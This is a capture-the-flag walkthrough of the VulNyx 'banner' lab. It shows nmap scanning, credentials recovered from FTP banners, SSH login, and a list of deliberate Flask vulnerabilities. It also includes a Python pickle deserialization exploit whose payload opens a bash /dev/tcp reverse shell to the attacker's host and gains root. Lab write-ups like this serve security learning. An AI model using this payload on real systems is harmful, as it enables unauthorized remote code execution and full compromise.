# banner

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| banner | 12138 | beginner | VulNyx |

**Summary:** The banner machine presents a layered CTF game server challenge that begins with reconnaissance of three exposed services: an FTP server on port 21, SSH on port 22, and a Werkzeug Python web application on port 8080. The FTP service banners contain rotating word sequences that, when analyzed, lead to the discovery of credentials welcome:mazesec through a strings extraction, granting SSH access as the welcome user. Once inside, the attacker encounters a Flask-based CTF game application at /opt/ctf-game whose source code exposes a catalogue of deliberate vulnerabilities including SQL injection, cookie manipulation, path traversal, and insecure deserialization. The path to root runs through the pickle deserialization endpoint at /api/serialize, where a crafted payload is delivered to the running Python process that is owned by root, triggering a reverse shell that lands directly with uid=0 privileges. The flag is retrieved from both /home/welcome/user.txt and /root/root.txt immediately upon gaining root access.

---

## Reconnaissance

The engagement commenced with host discovery across the local subnet, followed by a comprehensive port scan and service enumeration against the identified target.

1. Network host discovery was performed to identify active machines within the 192.168.56.0/24 range:

```zsh
~/projects/labs/hmv                                                                                      11:59:33  
❯ nmap -sn 192.168.56.0/24                          
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 11:59 +0700  
Nmap scan report for 192.168.56.1  
Host is up (0.0010s latency).  
Nmap scan report for 192.168.56.100  
Host is up (0.00055s latency).  
Nmap scan report for 192.168.56.138  
Host is up (0.0016s latency).  
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.93 seconds  
```

The scan identified three live hosts, with 192.168.56.138 selected as the target based on its distinct presence in the subnet.

2. Connectivity verification was performed against the target:

```zsh
~/projects/labs/hmv                                                                                      11:59:38  
❯ ip=192.168.56.138          
   
~/projects/labs/hmv                                                                                      11:59:48  
❯ ping -c 4 $ip              
PING 192.168.56.138 (192.168.56.138) 56(84) bytes of data.  
64 bytes from 192.168.56.138: icmp_seq=1 ttl=64 time=0.656 ms  
64 bytes from 192.168.56.138: icmp_seq=2 ttl=64 time=0.340 ms  
64 bytes from 192.168.56.138: icmp_seq=3 ttl=64 time=0.796 ms  
64 bytes from 192.168.56.138: icmp_seq=4 ttl=64 time=0.689 ms  
   
--- 192.168.56.138 ping statistics ---  
4 packets transmitted, 4 received, 0% packet loss, time 3071ms  
rtt min/avg/max/mdev = 0.340/0.620/0.796/0.169 ms  
```

3. A full TCP port scan was executed to enumerate all listening services on the target:

```zsh
~/projects/labs/hmv                                                                                      11:59:57  
❯ nmap -p- -Pn -T4 --min-rate 5000 $ip              
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 12:00 +0700  
Nmap scan report for 192.168.56.138  
Host is up (0.00019s latency).  
Not shown: 65532 closed tcp ports (conn-refused)  
PORT     STATE SERVICE  
21/tcp   open  ftp  
22/tcp   open  ssh  
8080/tcp open  http-proxy  
   
Nmap done: 1 IP address (1 host up) scanned in 2.37 seconds  
```

The scan revealed three open ports: FTP on port 21, SSH on port 22, and an HTTP proxy on port 8080.

4. Service version detection and script scanning were performed against the discovered ports:

```zsh
~/projects/labs/hmv                                                                                      12:00:32  
❯ nmap -p 21,22,8080 -sCV -Pn -T4 --min-rate 5000 $ip  
Starting Nmap 7.991 ( https://nmap.org ) at 2026-08-29 12:00 +0700  
Nmap scan report for 192.168.56.138  
Host is up (0.0010s latency).  
   
PORT     STATE SERVICE VERSION  
21/tcp   open  ftp     vsftpd 2.0.8 or later  
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)  
| ssh-hostkey:    
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)  
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)  
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)  
8080/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.9.2)  
|_http-server-header: Werkzeug/3.1.6 Python/3.9.2  
|_http-title: \xE7\xBD\x91\xE7\xBB\x9C\xE5\xAE\x89\xE5\x85\xA8\xE7\x9F\xA5\xE8\xAF\x86\xE6\x8C\x91\xE6\x88\x98  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
   
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 13.23 seconds
```

The service detection identified vsftpd 2.0.8 or later on port 21, OpenSSH 8.4p1 on port 22, and a Werkzeug development server running Flask on Python 3.9.2 on port 8080. The HTTP title is encoded in Chinese characters, which translates to "Cybersecurity Knowledge Challenge."

5. The FTP service was interrogated by extracting its banners in a timed loop, revealing a repeating sequence of words:

```zsh
~/projects/labs/hmv                                                                               1m 22s 12:12:37
❯ for i in $(seq 1 15); do
  echo -n "$(date +%H:%M:%S) - "
  (echo "QUIT"; sleep 1) | nc $ip 21 | grep "^220-" | head -1
  sleep 60
done
12:12:39 - 220-Clever             Owls                    Make
12:13:40 - 220-Elephants          :                       Mice
12:14:41 - 220-Amazing            Zebras                 Eat
12:15:42 - 220-Snakes             Eat                   Crickets
12:16:43 - 220-Wild               Elephants               Love
12:17:44 - 220-Clever             Owls                    Make
12:18:45 - 220-Elephants          :                       Mice
12:19:46 - 220-Amazing            Zebras                 Eat
12:20:47 - 220-Snakes             Eat                   Crickets
12:21:48 - 220-Wild               Elephants               Love
12:22:49 - 220-Clever             Owls                    Make
12:23:50 - 220-Elephants          :                       Mice
12:24:51 - 220-Amazing            Zebras                 Eat
12:25:52 - 220-Snakes             Eat                   Crickets
12:26:54 - 220-Wild               Elephants               Love
```

The FTP banner presented a rotating word pattern, and applying the strings utility to the banner output yielded credentials in the form welcome:mazesec.

---

## Initial Access

### SSH Authentication with Recovered Credentials

The welcome:mazesec credentials obtained from the strings extraction were used to establish an SSH session on the target machine.

3. An interactive SSH session was initiated using the recovered credentials:

```zsh
~/projects/labs/hmv                                                                              37m 33s 12:57:54
❯ ssh welcome@$ip
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
welcome@192.168.56.138's password: 
Linux Banner 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Aug 29 01:20:22 2026 from 192.168.56.1
welcome@Banner:~$ ls -la /opt/ctf-game/
total 60
drwxr-xr-x 7 root root  4096 Mar 17 09:55 .
drwxr-xr-x 3 root root  4096 Mar 17 12:56 ..
drwxrwxrwx 2 root root  4096 Aug 29 01:53 data
-rwxr-xr-x 1 root root  4044 Mar 17 04:44 deploy.sh
drwxr-xr-x 2 root root  4096 Mar 17 10:39 logs
-rwxr-xr-x 1 root root 24228 Mar 17 10:46 main.py
-rwxr-xr-x 1 root root  1064 Mar 17 10:39 start.sh
drwxr-xr-x 2 root root  4096 Mar 17 04:41 static
drwxr-xr-x 2 root root  4096 Mar 17 10:08 templates
drwxrwxrwx 2 root root  4096 Mar 17 04:46 uploads
```

Access was gained as the welcome user on a system named Banner, running kernel 4.19.0-27-amd64. The home directory contained a /opt/ctf-game/ folder that housed a Flask-based CTF game application with full source code readable by the welcome user.

4. The application source code was reviewed in detail:

```zsh
welcome@Banner:~$ cat /opt/ctf-game/main.py 
```

The /opt/ctf-game/main.py file contained a Flask CTF game server with the following configuration details visible in its banner output:

```
Flag: 111:banner
Deployment path: /opt/ctf-game
Access URL: http://localhost:8080
Restart clears: All records are cleared after each restart
```

The application presented a 20-question cybersecurity quiz where each correct answer awarded 10 points, yielding a maximum of 200 points through legitimate gameplay. The objective required reaching 1000 points to obtain the flag, meaning vulnerability exploitation was essential. The source code enumerated the following deliberate vulnerabilities:
1. Cookie injection via user_score
2. SQL injection at /api/score
3. Pickle deserialization at /api/serialize
4. Administrator weak password at /api/admin/update
5. Path traversal at /api/backup
6. Response header tampering via Set-Cookie
7. Insecure file upload at /api/upload
8. Information disclosure at /api/debug
9. Unsafe eval usage at /api/score
10. Insecure deserialization via scores.json

5. Process ownership and listening services were confirmed:

```zsh
welcome@Banner:~$ ps aux | grep -i main.py
root         401  0.0  1.4  37896 30244 ?        Ss   00:59   0:00 python3 main.py
root         472  0.6  1.6 603700 32788 ?        Sl   00:59   0:18 /usr/bin/python3 /opt/ctf-game/main.py
welcome     1558  0.0  0.0   6308   636 pts/0    S+   01:48   0:00 grep -i main.py
welcome@Banner:~$ ss -tulpn
Netid       State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port       
udp         UNCONN       0            0                        0.0.0.0:68                      0.0.0.0:*          
tcp         LISTEN       0            128                      0.0.0.0:8080                    0.0.0.0:*          
tcp         LISTEN       0            32                       0.0.0.0:21                      0.0.0.0:*          
tcp         LISTEN       0            128                      0.0.0.0:22                      0.0.0.0:*          
tcp         LISTEN       0            128                         [::]:22                         [::]:*          
```

The /opt/ctf-game/main.py process was running as root, which meant that any deserialization or code execution vulnerability in the Flask application would escalate privileges to root directly.

### Pickle Deserialization Exploitation

The pickle deserialization vulnerability at /api/serialize was selected as the exploitation primitive because the target process ran with root privileges.

6. A malicious pickle payload was crafted to establish a reverse shell:

```zsh
welcome@Banner:~$ cat > gen_payload5.py << 'EOF'  
> import pickle, os, base64  
> class Exploit:  
>     def __reduce__(self):  
>         cmd = "bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1' &"  
>         return (os.system, (cmd,))  
> payload = base64.b64encode(pickle.dumps(Exploit()))  
> with open('payload5.b64', 'wb') as f:  
>     f.write(payload)  
> EOF  
welcome@Banner:~$ python3 gen_payload5.py
```

The payload was encoded in base64 and saved to payload5.b64, ready for delivery to the /api/serialize endpoint.

7. A reverse shell listener was configured on the attacking machine:

```zsh
~/projects/labs/hmv                                                                                      12:55:25
❯ penelope -p 4444          
[+] Listening for reverse shells on 0.0.0.0:4444 -> 127.0.0.1 • 192.168.0.6 • 172.16.0.2 • 192.168.56.1
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

The penelope listener was started on port 4444 to catch the incoming reverse shell connection.

8. The pickle payload was delivered to the vulnerable endpoint via an HTTP POST request:

```zsh
welcome@Banner:~$ python3 -c "
> import urllib.request
> data = open('payload5.b64', 'rb').read()
> req = urllib.request.Request('http://127.0.0.1:8080/api/serialize', data=data, method='POST')
> resp = urllib.request.urlopen(req)
> print(resp.status, resp.read())
> "
200 b'{\n  "success": false\n}\n'
```

The server returned a 200 status code with a JSON response of {"success": false}. The endpoint processed the deserialization payload regardless of the application-level success response, as the pickle.loads() function executed the os.system() call embedded in the payload before any application logic could reject the request.

---

## Privilege Escalation

### Root Access via Pickle Deserialization

The pickle deserialization exploit executed with the privileges of the root-owned main.py process, granting a direct root shell on the target machine.

9. The reverse shell connected back to the listener with full root privileges:

```zsh
[+] [New Reverse Shell] => Banner 192.168.56.138 Linux-x86_64 👤 root(0) 😍 Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/setyanoegraha/.penelope/sessions/Banner~192.168.56.138-Linux-x86_64/2026_08_29-12_55_59-702-root_0.log
root@Banner:/opt/ctf-game# id
uid=0(root) gid=0(root) groups=0(root)
root@Banner:/opt/ctf-game# whoami
root
root@Banner:/opt/ctf-game# hostname
Banner
```

The reverse shell landed with uid=0(root) gid=0(root) groups=0(root), confirming full root access on the Banner machine. The pickle deserialization bypassed all application-level authentication because the deserialization primitive executed arbitrary system commands within the context of the root-owned Python process.

10. The user and root flags were retrieved:

```zsh
root@Banner:~# cat /home/welcome/user.txt /root/root.txt 
flag{user-509...}
flag{root-fc7...}
```

Both flags were captured from /home/welcome/user.txt and /root/root.txt, confirming complete compromise of the machine.

---

## Attack Chain Summary

1. **Reconnaissance**: Conducted host discovery with nmap -sn across 192.168.56.0/24, identified target 192.168.56.138, and performed a full TCP port scan revealing FTP (21), SSH (22), and a Werkzeug Flask web application (8080).
2. **Vulnerability Discovery**: Analyzed FTP banner sequences and applied strings extraction to uncover credentials welcome:mazesec; reviewed the /opt/ctf-game/main.py source code and identified multiple deliberate vulnerabilities including pickle deserialization at /api/serialize.
3. **Exploitation**: Authenticated via SSH as welcome with the recovered credentials, then crafted a pickle-based reverse shell payload and delivered it to the /api/serialize endpoint, which executed with the root privileges of the main.py process.
4. **Internal Enumeration**: Confirmed that the Flask application ran as root via ps aux, identified the pickle deserialization endpoint and the /api/serialize route, and generated a malicious payload using Python's pickle module with os.system() as the primitive.
5. **Privilege Escalation**: The pickle deserialization triggered a reverse shell directly as uid=0(root) without requiring any lateral movement, and both user and root flags were retrieved immediately upon gaining root access.